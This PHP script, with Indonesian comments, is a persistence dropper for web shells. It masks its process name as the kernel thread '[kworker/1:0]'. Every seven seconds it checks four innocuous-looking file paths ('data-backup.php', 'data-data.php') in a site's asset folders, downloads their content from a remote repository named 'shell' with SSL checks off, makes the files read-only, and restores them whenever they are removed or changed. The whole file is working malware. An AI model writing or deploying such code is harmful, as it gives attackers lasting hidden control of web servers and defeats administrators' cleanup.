<?php
if (function_exists('cli_set_process_title')) {
    cli_set_process_title("[kworker/1:0]");
}

// Daftar file yang dipantau
$files = [
    "/var/www/html/public/video/data-backup.php",
    "/var/www/html/public/dokumen/berkas/data-data.php",
    "/var/www/html/public/assets/e-learning/scss/bootstrap/scss/forms/data-backup.php",
    "/var/www/html/public/assets/berry/css/plugins/themes/data-data.php",
];

// URL file sumber
$url = "https://raw.githubusercontent.com/Kennn403/shell/refs/heads/main/js.php";

// Fungsi untuk mengunduh file menggunakan CURL dan file_put_contents
function download_file($file_path, $url)
{
    echo "Mengunduh file: $file_path\n";
    
    // Inisialisasi CURL
    $ch = curl_init();
    
    // Set URL dan opsi CURL
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Menyimpan output sebagai string
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Timeout 30 detik
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Ikuti redirect jika ada
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Nonaktifkan verifikasi SSL (jika ada masalah dengan SSL)

    // Eksekusi CURL dan ambil hasilnya
    $content = curl_exec($ch);
    
    // Cek apakah terjadi error pada CURL
    if (curl_errno($ch)) {
        echo "CURL Error: " . curl_error($ch) . "\n";
        curl_close($ch);
        return;
    }

    // Cek jika konten berhasil diunduh
    if ($content !== false) {
        // Menulis konten ke file
        file_put_contents($file_path, $content);
        
        // Mengubah izin file menjadi read-only
        chmod($file_path, 0444);
        echo "Berhasil mengunduh dan menyimpan file: $file_path\n";
    } else {
        echo "Gagal mengunduh file: $file_path. Periksa koneksi atau URL.\n";
    }

    // Menutup koneksi CURL
    curl_close($ch);
}

// Fungsi untuk menghitung hash MD5 file
function get_file_hash($file)
{
    return file_exists($file) ? md5_file($file) : '';
}

// Fungsi mengatur izin direktori menjadi 755
function set_permissions($dir_path)
{
    while ($dir_path != "/var/www/html") {
        chmod($dir_path, 0755);
        $dir_path = dirname($dir_path);
    }
}

// Pemantauan file
while (true) {
    foreach ($files as $file) {
        $dir_path = dirname($file);

        // Buat direktori jika belum ada
        if (!is_dir($dir_path)) {
            mkdir($dir_path, 0755, true);
            echo "Membuat direktori: $dir_path\n";
        }

        // Atur izin direktori
        set_permissions($dir_path);

        // Periksa dan unduh file jika perlu
        if (!file_exists($file)) {
            download_file($file, $url);
        } else {
            $original_hash = get_file_hash($file);
            $current_hash = md5(file_get_contents($url)); // Using file_get_contents() only for hash check

            if ($original_hash != $current_hash) {
                echo "File berubah, mengunduh ulang: $file\n";
                download_file($file, $url);
            }
        }
    }
    sleep(7);
}
?>
